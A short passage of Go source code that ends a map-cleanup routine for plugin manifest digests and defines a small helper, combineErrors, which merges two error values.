		if a.pluginManifestDigests != nil {
			delete(a.pluginManifestDigests, key)
		}
	}
}


func combineErrors(a, b error) error {
	if a == nil {
		return b
	}
	if b == nil {
		return a
	}
	return errors.Join(a, b)
}
